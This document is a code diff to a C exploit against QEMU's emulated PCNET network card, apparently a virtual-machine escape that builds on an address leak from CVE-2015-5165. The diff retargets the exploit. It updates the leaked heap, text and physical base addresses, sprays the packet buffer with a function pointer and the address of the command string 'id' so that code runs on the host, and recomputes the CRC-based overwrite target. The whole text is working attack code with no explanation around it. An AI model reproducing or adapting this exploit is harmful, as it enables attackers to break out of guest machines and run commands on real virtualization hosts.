@@ -54,7 +54,7 @@ POSSIBILITY OF SUCH DAMAGE.
 #define page_aligned __attribute__((aligned(PAGE_SIZE)))
 
 #define PCNET_BUFFER_SIZE 4096
-#define PCNET_PORT        0xc100
+#define PCNET_PORT        0xc140
 
 #define DRX     0x0001
 #define DTX     0x0002
@@ -165,8 +165,8 @@ struct pcnet_desc {
 };
 
 static uint8_t pcnet_packet[PCNET_BUFFER_SIZE] = {
-	0x52, 0x54, 0x00, 0x12, 0x34, 0x56, 0x52,
-	0x54, 0x00, 0x12, 0x34, 0x56, 0x08, 0x00,
+	0x52, 0x54, 0x00, 0x12, 0x34, 0x57, 0x52,
+	0x54, 0x00, 0x12, 0x34, 0x57, 0x08, 0x00,
 };
 
 static int fd = -1;
@@ -296,14 +296,17 @@ int main()
 	}
   
   //leaked address from CVE-2015-5165
-	heapBaseAddr = 0x5621a12ee000;
-
+	heapBaseAddr = 0x5b1b204ff000;
+	uint64_t text_base = 0x5b1b1e7b7000;
+	uint64_t phy_base = 0x7b09a4000000;
 	uint64_t *packet_ptr;
+	char* str = "id";
 	packet_ptr = pcnet_packet;
-	for(int j=0x10; j<0x1f8; j += 2)
+	for(int j=0x10; j<0x1f8; j += 3)
 	{
-		*(packet_ptr + j) = 0x414141414141;
+		*(packet_ptr + j) = text_base+0x9e3b0;
 		*(packet_ptr + j + 1) = 0x424242424242;
+		*(packet_ptr + j + 2) = phy_base + gva_to_gpa(str);
 	}
 
 	iopl(3);
@@ -328,7 +331,7 @@ int main()
 	while (ptr != &pcnet_packet[PCNET_BUFFER_SIZE - 4])
 		CRC(fcs, *ptr++);
 
-	targetValue = (heapBaseAddr + 0x1289120 - 0x30) & 0xffffffff;
+	targetValue = (heapBaseAddr + 0x1463550 + 0x80 - 0x30) & 0xffffffff;
 
 	pcnet_packet_patch_crc(ptr, fcs, htonl(targetValue));
 
@@ -357,11 +360,11 @@ int main()
 
 
 	/* stop card */
-	outw(0, PCNET_PORT + RAP);
-	outw(0x4, PCNET_PORT + RDP);
+	//outw(0, PCNET_PORT + RAP);
+	//outw(0x4, PCNET_PORT + RDP);
 	
 
 	//printf("Can you get it?\n");
-	//getchar();
+	getchar();
 	return 0;
 }
